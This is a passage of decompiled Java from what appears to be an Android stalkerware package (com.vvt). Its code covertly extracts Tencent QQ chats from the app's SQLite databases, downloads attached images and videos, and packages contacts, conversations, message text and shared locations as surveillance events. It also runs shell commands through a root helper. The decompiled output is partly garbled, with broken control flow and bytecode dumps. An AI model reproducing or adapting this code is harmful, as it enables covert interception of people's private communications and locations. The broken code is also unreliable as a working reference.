        Object localObject1;
        Object localObject2;
        Object localObject3;
        Object localObject4;
        Object localObject5;
        int j;
        long l;
        int k;
        label352:
        boolean bool2 = b;
        if (bool2)
        {
          continue;
          localObject5 = localObject3;
          localObject3 = localObject4;
        }
      }
    }
    localObject1 = new com/vvt/im/events/info/a;
    ((com.vvt.im.events.info.a)localObject1).<init>();
    ((com.vvt.im.events.info.a)localObject1).a((String)localObject2);
    ((com.vvt.im.events.info.a)localObject1).c((String)localObject4);
    ((com.vvt.im.events.info.a)localObject1).b((String)localObject5);
    ((com.vvt.im.events.info.a)localObject1).d((String)localObject3);
    localArrayList.add(localObject1);
    bool2 = a;
    if (bool2) {}
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return localArrayList;
      label417:
      l = 0L;
      break;
      label423:
      k = 1;
      if (j != k) {
        break label530;
      }
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      localObject2 = ((StringBuilder)localObject2).append((String)localObject5);
      localObject5 = ".jpg";
      localObject2 = ((StringBuilder)localObject2).append((String)localObject5);
      localObject2 = ((StringBuilder)localObject2).toString();
      localObject5 = localObject3;
      localObject3 = localObject4;
      break label352;
      label484:
      bool2 = b;
      if (bool2)
      {
        continue;
        label495:
        bool2 = a;
        if (bool2)
        {
          continue;
          label506:
          bool2 = b;
          if (!bool2) {}
        }
      }
    }
  }
  
  private static ArrayList a(MessageForPic paramMessageForPic, int paramInt, com.vvt.base.b paramb, String paramString)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = false;
    String str1 = null;
    for (;;)
    {
      try
      {
        localObject1 = ImMediaFileType.ATTACHMENT;
        localObject2 = com.vvt.im.a.c.a((ImMediaFileType)localObject1);
        localObject1 = ImType.QQ;
        localObject3 = ImMediaFileType.ATTACHMENT;
        localObject3 = com.vvt.im.a.c.a(paramString, (ImType)localObject1, (ImMediaFileType)localObject3);
        if (paramInt != 0) {
          continue;
        }
        localObject1 = paramMessageForPic.rawMsgUrl;
        boolean bool2 = com.vvt.ag.b.a((String)localObject1);
        if (bool2) {
          continue;
        }
        int i = 3;
        Object localObject4 = new String[i];
        i = 0;
        localObject1 = null;
        String str2 = "101.227.131.67";
        localObject4[0] = str2;
        i = 1;
        str2 = "61.151.234.53";
        localObject4[i] = str2;
        i = 2;
        str2 = "gchat.qpic.cn";
        localObject4[i] = str2;
        str2 = paramMessageForPic.rawMsgUrl;
        int m = localObject4.length;
        i = 0;
        localObject1 = null;
        if (i < m)
        {
          Object localObject5 = localObject4[i];
          String str3 = "http://%s%s";
          int n = 2;
          Object[] arrayOfObject = new Object[n];
          arrayOfObject[0] = localObject5;
          int i1 = 1;
          arrayOfObject[i1] = str2;
          localObject5 = String.format(str3, arrayOfObject);
          boolean bool6 = a;
          if (bool6) {}
          localObject5 = c((String)localObject5);
          bool6 = a;
          if ((bool6) && (localObject5 == null)) {
            continue;
          }
          int i2 = localObject5.length;
          n = 2;
          if (i2 < n) {
            continue;
          }
          str1 = com.vvt.io.d.a((byte[])localObject5, (String)localObject3, (String)localObject2);
        }
        bool3 = a;
        if ((bool3) && (str1 == null)) {
          continue;
        }
        localObject1 = "image/jpg";
        int i3 = 1;
        localObject4 = new java/io/File;
        ((File)localObject4).<init>(str1);
        long l = ((File)localObject4).length();
        boolean bool5 = a;
        if (bool5) {}
        boolean bool7 = a(i3, paramb, l);
        boolean bool8 = a;
        if ((bool8) && (!bool7)) {
          continue;
        }
        localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
        localObject3 = ".jpg";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject2 = ((StringBuilder)localObject2).toString();
        localObject3 = new com/vvt/im/events/info/a;
        ((com.vvt.im.events.info.a)localObject3).<init>();
        ((com.vvt.im.events.info.a)localObject3).a((String)localObject2);
        ((com.vvt.im.events.info.a)localObject3).c(str1);
        ((com.vvt.im.events.info.a)localObject3).b((String)localObject1);
        ((com.vvt.im.events.info.a)localObject3).d(str1);
        localArrayList.add(localObject3);
        bool1 = a;
        if (!bool1) {}
      }
      catch (Exception localException)
      {
        Object localObject1;
        Object localObject2;
        Object localObject3;
        boolean bool3;
        int j;
        int k;
        boolean bool4;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      bool3 += true;
      continue;
      k = b;
      if (k != 0)
      {
        continue;
        k = 1;
        if (paramInt == k)
        {
          localObject1 = paramMessageForPic.thumbMsgUrl;
          bool4 = com.vvt.ag.b.a((String)localObject1);
          if (!bool4)
          {
            str1 = paramMessageForPic.thumbMsgUrl;
            localObject1 = paramb.f();
            com.vvt.capture.qq.b.a.a(str1, (String)localObject3, (String)localObject2, paramString, (String)localObject1);
            str1 = p.a((String)localObject3, (String)localObject2);
          }
          else
          {
            bool4 = b;
            if (bool4)
            {
              continue;
              localObject1 = new java/io/File;
              ((File)localObject1).<init>(str1);
              ((File)localObject1).delete();
            }
          }
        }
      }
    }
  }
  
  private static ArrayList a(MessageForShortVideo paramMessageForShortVideo, com.vvt.base.b paramb, String paramString)
  {
    int i = 1;
    localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      localObject2 = paramMessageForShortVideo.videoFileName;
      boolean bool4 = a;
      if (bool4) {}
      bool4 = com.vvt.ag.b.a((String)localObject2);
      if (bool4) {
        break label398;
      }
      localObject3 = new java/io/File;
      ((File)localObject3).<init>((String)localObject2);
      bool4 = ((File)localObject3).exists();
      if (bool4) {
        break label391;
      }
      int k = paramMessageForShortVideo.videoFileSize;
      if (k <= 0) {
        break label422;
      }
      bool6 = a;
      if (bool6) {}
      localObject2 = a((String)localObject2);
      localObject2 = a((String)localObject2, k);
      boolean bool5 = com.vvt.ag.b.a((String)localObject2);
      if (bool5) {
        break label383;
      }
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject2;
        Object localObject3;
        boolean bool6;
        label130:
        int j;
        long l;
        boolean bool3;
        Object localObject4;
        Object localObject6;
        boolean bool1 = b;
        if (bool1)
        {
          continue;
          bool1 = false;
          Object localObject5 = null;
          localObject1 = localObject2;
        }
      }
    }
    bool2 = a;
    if ((!bool2) || (i != 0))
    {
      com.vvt.io.d.i((String)localObject1);
      i = 3;
      j = paramMessageForShortVideo.videoFileSize;
      l = j;
      bool3 = a;
      if (bool3) {}
      bool1 = a(i, paramb, l);
      bool3 = a;
      if ((!bool3) || (bool1))
      {
        localObject4 = ImType.QQ;
        localObject2 = ImMediaFileType.ATTACHMENT;
        localObject4 = com.vvt.im.a.c.a(paramString, (ImType)localObject4, (ImMediaFileType)localObject2);
        localObject2 = ImMediaFileType.ATTACHMENT;
        localObject2 = com.vvt.im.a.c.a((ImMediaFileType)localObject2);
        localObject3 = p.a((String)localObject4, (String)localObject2);
        bool6 = a;
        if (bool6) {}
        localObject6 = paramb.f();
        com.vvt.capture.qq.b.a.a((String)localObject1, (String)localObject4, (String)localObject2, paramString, (String)localObject6);
        localObject4 = a(paramString, (String)localObject3);
        localObject1 = new java/lang/StringBuilder;
        ((StringBuilder)localObject1).<init>();
        localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject2 = ".mp4";
        localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
        localObject1 = ((StringBuilder)localObject1).toString();
        localObject2 = "video/mp4";
        localObject6 = new com/vvt/im/events/info/a;
        ((com.vvt.im.events.info.a)localObject6).<init>();
        ((com.vvt.im.events.info.a)localObject6).a((String)localObject1);
        ((com.vvt.im.events.info.a)localObject6).c((String)localObject3);
        ((com.vvt.im.events.info.a)localObject6).b((String)localObject2);
        ((com.vvt.im.events.info.a)localObject6).d((String)localObject4);
        localArrayList.add(localObject6);
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      label383:
      bool1 = false;
      localObject4 = null;
      break;
      label391:
      localObject1 = localObject2;
      break label130;
      label398:
      bool1 = b;
      if (!bool1) {}
    }
  }
  
  /* Error */
  public static ArrayList a(String paramString1, String paramString2, String paramString3, long paramLong, com.vvt.base.b paramb)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 6
    //   3: getstatic 17	com/vvt/capture/qq/MyUncaughtExceptionHandler:a	Z
    //   6: istore 7
    //   8: iload 7
    //   10: ifeq +3 -> 13
    //   13: new 306	java/util/ArrayList
    //   16: astore 8
    //   18: aload 8
    //   20: invokespecial 307	java/util/ArrayList:<init>	()V
    //   23: aload_1
    //   24: invokestatic 668	com/vvt/capture/qq/a/a:removeFromPath	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   27: astore 9
    //   29: aload 9
    //   31: ifnull +283 -> 314
    //   34: getstatic 142	java/util/Locale:US	Ljava/util/Locale;
    //   37: astore 10
    //   39: ldc_w 670
    //   42: astore 11
    //   44: iconst_2
    //   45: istore 12
    //   47: iload 12
    //   49: anewarray 4	java/lang/Object
    //   52: astore 13
    //   54: iconst_0
    //   55: istore 14
    //   57: aload 13
    //   59: iconst_0
    //   60: aload_2
    //   61: aastore
    //   62: iconst_1
    //   63: istore 14
    //   65: lload_3
    //   66: invokestatic 673	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   69: astore 15
    //   71: aload 13
    //   73: iload 14
    //   75: aload 15
    //   77: aastore
    //   78: aload 10
    //   80: aload 11
    //   82: aload 13
    //   84: invokestatic 156	java/lang/String:format	(Ljava/util/Locale;Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   87: astore 10
    //   89: aconst_null
    //   90: astore 11
    //   92: aload 9
    //   94: aload 10
    //   96: aconst_null
    //   97: invokevirtual 63	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   100: astore 10
    //   102: aload 10
    //   104: checkcast 65	com/vvt/capture/qq/d
    //   107: astore 10
    //   109: aload 10
    //   111: ifnull +192 -> 303
    //   114: aload 9
    //   116: aload_0
    //   117: aload 10
    //   119: aload 5
    //   121: aload_2
    //   122: invokestatic 676	com/vvt/capture/qq/MyUncaughtExceptionHandler:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Lcom/vvt/capture/qq/d;Lcom/vvt/base/removeFromPath;Ljava/lang/String;)Ljava/util/ArrayList;
    //   125: astore 8
    //   127: aload 10
    //   129: astore 6
    //   131: aload 8
    //   133: astore 10
    //   135: aload 6
    //   137: ifnull +8 -> 145
    //   140: aload 6
    //   142: invokevirtual 112	com/vvt/capture/qq/d:close	()V
    //   145: aload 9
    //   147: ifnull +8 -> 155
    //   150: aload 9
    //   152: invokevirtual 677	android/database/sqlite/SQLiteDatabase:close	()V
    //   155: getstatic 17	com/vvt/capture/qq/MyUncaughtExceptionHandler:a	Z
    //   158: istore 16
    //   160: iload 16
    //   162: ifeq +3 -> 165
    //   165: aload 10
    //   167: areturn
    //   168: astore 10
    //   170: iconst_0
    //   171: istore 7
    //   173: aconst_null
    //   174: astore 10
    //   176: getstatic 21	com/vvt/capture/qq/MyUncaughtExceptionHandler:removeFromPath	Z
    //   179: istore 17
    //   181: iload 17
    //   183: ifeq +3 -> 186
    //   186: aload 10
    //   188: ifnull +8 -> 196
    //   191: aload 10
    //   193: invokevirtual 112	com/vvt/capture/qq/d:close	()V
    //   196: aload 6
    //   198: ifnull +8 -> 206
    //   201: aload 6
    //   203: invokevirtual 677	android/database/sqlite/SQLiteDatabase:close	()V
    //   206: aload 8
    //   208: astore 10
    //   210: goto -55 -> 155
    //   213: astore 10
    //   215: iconst_0
    //   216: istore 17
    //   218: aconst_null
    //   219: astore 9
    //   221: aload 6
    //   223: ifnull +8 -> 231
    //   226: aload 6
    //   228: invokevirtual 112	com/vvt/capture/qq/d:close	()V
    //   231: aload 9
    //   233: ifnull +8 -> 241
    //   236: aload 9
    //   238: invokevirtual 677	android/database/sqlite/SQLiteDatabase:close	()V
    //   241: aload 10
    //   243: athrow
    //   244: astore 10
    //   246: goto -25 -> 221
    //   249: astore 8
    //   251: aload 10
    //   253: astore 6
    //   255: aload 8
    //   257: astore 10
    //   259: goto -38 -> 221
    //   262: astore 8
    //   264: aload 6
    //   266: astore 9
    //   268: aload 10
    //   270: astore 6
    //   272: aload 8
    //   274: astore 10
    //   276: goto -55 -> 221
    //   279: astore 10
    //   281: iconst_0
    //   282: istore 7
    //   284: aconst_null
    //   285: astore 10
    //   287: aload 9
    //   289: astore 6
    //   291: goto -115 -> 176
    //   294: astore 6
    //   296: aload 9
    //   298: astore 6
    //   300: goto -124 -> 176
    //   303: aload 10
    //   305: astore 6
    //   307: aload 8
    //   309: astore 10
    //   311: goto -176 -> 135
    //   314: aload 8
    //   316: astore 10
    //   318: goto -183 -> 135
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	321	0	paramString1	String
    //   0	321	1	paramString2	String
    //   0	321	2	paramString3	String
    //   0	321	3	paramLong	long
    //   0	321	5	paramb	com.vvt.base.removeFromPath
    //   1	289	6	localObject1	Object
    //   294	1	6	localException1	Exception
    //   298	8	6	localObject2	Object
    //   6	277	7	bool1	boolean
    //   16	191	8	localArrayList1	ArrayList
    //   249	7	8	localObject3	Object
    //   262	53	8	localObject4	Object
    //   27	270	9	localObject5	Object
    //   37	129	10	localObject6	Object
    //   168	1	10	localException2	Exception
    //   174	35	10	localArrayList2	ArrayList
    //   213	29	10	localObject7	Object
    //   244	8	10	localObject8	Object
    //   257	18	10	localObject9	Object
    //   279	1	10	localException3	Exception
    //   285	32	10	localObject10	Object
    //   42	49	11	str	String
    //   45	3	12	i	int
    //   52	31	13	arrayOfObject	Object[]
    //   55	19	14	j	int
    //   69	7	15	localLong	Long
    //   158	3	16	bool2	boolean
    //   179	38	17	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   23	27	168	java/lang/Exception
    //   23	27	213	finally
    //   34	37	244	finally
    //   47	52	244	finally
    //   60	62	244	finally
    //   65	69	244	finally
    //   75	78	244	finally
    //   82	87	244	finally
    //   96	100	244	finally
    //   102	107	244	finally
    //   121	125	249	finally
    //   176	179	262	finally
    //   34	37	279	java/lang/Exception
    //   47	52	279	java/lang/Exception
    //   60	62	279	java/lang/Exception
    //   65	69	279	java/lang/Exception
    //   75	78	279	java/lang/Exception
    //   82	87	279	java/lang/Exception
    //   96	100	279	java/lang/Exception
    //   102	107	279	java/lang/Exception
    //   121	125	294	java/lang/Exception
  }
  
  static List a(QQData paramQQData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramQQData.b();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.TENCENT_QQ.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramQQData.f().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramQQData.f().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramQQData.f().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramQQData.f().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramQQData.f().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramQQData.i().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramQQData.i().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramQQData.i().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramQQData.i().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramQQData.i().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramQQData.b();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.TENCENT_QQ.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramQQData.f().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramQQData.e();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramQQData.f().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (bool4)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramQQData.e();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramQQData.f().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (bool5)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramQQData.b();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.TENCENT_QQ.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramQQData.f().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramQQData.j();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramQQData.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramQQData.g().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d1 = paramQQData.g().a();
      ((com.vvt.events.e)localObject1).a(d1);
      d1 = paramQQData.g().b();
      ((com.vvt.events.e)localObject1).b(d1);
      localObject2 = paramQQData.g().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramQQData.i().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramQQData.d();
    localObject5 = QQData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramQQData.b();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.TENCENT_QQ.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramQQData.c();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramQQData.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramQQData.d();
      localObject2 = QQData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramQQData.h().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool3 = false;
    boolean bool4 = a;
    if (bool4) {}
    long l1 = 0L;
    bool4 = paramLong < l1;
    if (!bool4) {}
    boolean bool2;
    for (bool4 = false;; bool4 = bool2)
    {
      long l2;
      if (paramInt == i)
      {
        l2 = paramb.b();
        boolean bool1 = paramLong < l2;
        if (!bool1) {
          break label104;
        }
      }
      for (;;)
      {
        bool4 = a;
        if (bool4) {}
        return bool3;
        int j = 3;
        f = 4.2E-45F;
        if (paramInt == j)
        {
          l2 = paramb.c();
          bool2 = paramLong < l2;
          if (bool2) {}
        }
        else
        {
          label104:
          do
          {
            bool3 = bool4;
            break;
            l2 = paramb.e();
            bool2 = paramLong < l2;
          } while (!bool2);
        }
      }
    }
  }
  
  private static ArrayList b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = true;
    Object localObject = new String[bool1];
    boolean bool2 = false;
    localObject[0] = paramString;
    String str1 = "SELECT * FROM DiscussionMemberInfo WHERE (discussionUin = ?)";
    localObject = (d)paramSQLiteDatabase.rawQuery(str1, (String[])localObject);
    if (localObject != null)
    {
      bool2 = ((d)localObject).moveToFirst();
      if (bool2) {
        for (;;)
        {
          bool2 = ((d)localObject).isAfterLast();
          if (bool2) {
            break;
          }
          int i = ((d)localObject).getColumnIndex("memberUin");
          str1 = ((d)localObject).getString(i);
          int j = ((d)localObject).getColumnIndex("memberName");
          String str2 = ((d)localObject).getString(j);
          com.vvt.im.events.info.e locale = new com/vvt/im/events/info/e;
          locale.<init>();
          locale.d(str1);
          locale.c(str2);
          boolean bool3 = a;
          if (bool3) {}
          localArrayList.add(locale);
          ((d)localObject).moveToNext();
        }
      }
    }
    if (localObject != null) {
      ((d)localObject).close();
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  /* Error */
  private static List b(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: new 306	java/util/ArrayList
    //   5: astore_2
    //   6: aload_2
    //   7: invokespecial 307	java/util/ArrayList:<init>	()V
    //   10: invokestatic 897	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   13: astore_3
    //   14: ldc_w 899
    //   17: astore 4
    //   19: iconst_2
    //   20: istore 5
    //   22: iload 5
    //   24: anewarray 4	java/lang/Object
    //   27: astore 6
    //   29: iconst_0
    //   30: istore 7
    //   32: aconst_null
    //   33: astore 8
    //   35: ldc_w 901
    //   38: astore 9
    //   40: aload 6
    //   42: iconst_0
    //   43: aload 9
    //   45: aastore
    //   46: iconst_1
    //   47: istore 7
    //   49: aload 6
    //   51: iload 7
    //   53: aload_0
    //   54: aastore
    //   55: aload 4
    //   57: aload 6
    //   59: invokestatic 645	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   62: astore 4
    //   64: aload_3
    //   65: aload 4
    //   67: invokevirtual 902	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   70: astore 6
    //   72: getstatic 17	com/vvt/capture/qq/MyUncaughtExceptionHandler:a	Z
    //   75: istore 10
    //   77: iload 10
    //   79: ifeq +3 -> 82
    //   82: new 904	java/io/BufferedReader
    //   85: astore 4
    //   87: new 906	java/io/StringReader
    //   90: astore 8
    //   92: aload 8
    //   94: aload 6
    //   96: invokespecial 907	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   99: aload 4
    //   101: aload 8
    //   103: invokespecial 910	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   106: aload 4
    //   108: invokevirtual 913	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   111: astore_1
    //   112: aload_1
    //   113: ifnull +84 -> 197
    //   116: aload_1
    //   117: invokestatic 918	com/vvt/io/removeFromPath:a	(Ljava/lang/String;)Lcom/vvt/io/MyUncaughtExceptionHandler;
    //   120: astore_1
    //   121: aload_1
    //   122: ifnull -16 -> 106
    //   125: aload_1
    //   126: getfield 920	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   129: istore 5
    //   131: iload 5
    //   133: ifne -27 -> 106
    //   136: aload_2
    //   137: aload_1
    //   138: invokeinterface 560 2 0
    //   143: pop
    //   144: goto -38 -> 106
    //   147: astore_1
    //   148: aload_3
    //   149: astore_1
    //   150: getstatic 21	com/vvt/capture/qq/MyUncaughtExceptionHandler:removeFromPath	Z
    //   153: istore 11
    //   155: iload 11
    //   157: ifeq +3 -> 160
    //   160: aload 4
    //   162: invokestatic 923	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   165: aload_1
    //   166: ifnull +7 -> 173
    //   169: aload_1
    //   170: invokevirtual 925	com/vvt/shell/f:d	()V
    //   173: aload_2
    //   174: areturn
    //   175: astore 4
    //   177: iconst_0
    //   178: istore 11
    //   180: aconst_null
    //   181: astore_3
    //   182: aload_1
    //   183: invokestatic 923	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   186: aload_3
    //   187: ifnull +7 -> 194
    //   190: aload_3
    //   191: invokevirtual 925	com/vvt/shell/f:d	()V
    //   194: aload 4
    //   196: athrow
    //   197: aload 4
    //   199: invokestatic 923	com/vvt/io/d:a	(Ljava/io/BufferedReader;)V
    //   202: aload_3
    //   203: ifnull -30 -> 173
    //   206: aload_3
    //   207: invokevirtual 925	com/vvt/shell/f:d	()V
    //   210: goto -37 -> 173
    //   213: astore 4
    //   215: goto -33 -> 182
    //   218: astore 12
    //   220: aload 4
    //   222: astore_1
    //   223: aload 12
    //   225: astore 4
    //   227: goto -45 -> 182
    //   230: astore 12
    //   232: aload_1
    //   233: astore_3
    //   234: aload 4
    //   236: astore_1
    //   237: aload 12
    //   239: astore 4
    //   241: goto -59 -> 182
    //   244: astore 4
    //   246: iconst_0
    //   247: istore 10
    //   249: aconst_null
    //   250: astore 4
    //   252: goto -102 -> 150
    //   255: astore 4
    //   257: iconst_0
    //   258: istore 10
    //   260: aconst_null
    //   261: astore 4
    //   263: aload_3
    //   264: astore_1
    //   265: goto -115 -> 150
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	268	0	paramString	String
    //   1	137	1	localObject1	Object
    //   147	1	1	localException1	Exception
    //   149	116	1	localObject2	Object
    //   5	169	2	localArrayList	ArrayList
    //   13	251	3	localObject3	Object
    //   17	144	4	localObject4	Object
    //   175	23	4	localBufferedReader	java.io.BufferedReader
    //   213	8	4	localObject5	Object
    //   225	15	4	localObject6	Object
    //   244	1	4	localException2	Exception
    //   250	1	4	localObject7	Object
    //   255	1	4	localException3	Exception
    //   261	1	4	localObject8	Object
    //   20	112	5	i	int
    //   27	68	6	localObject9	Object
    //   30	22	7	j	int
    //   33	69	8	localStringReader	java.io.StringReader
    //   38	6	9	str	String
    //   75	184	10	bool1	boolean
    //   153	26	11	bool2	boolean
    //   218	6	12	localObject10	Object
    //   230	8	12	localObject11	Object
    // Exception table:
    //   from	to	target	type
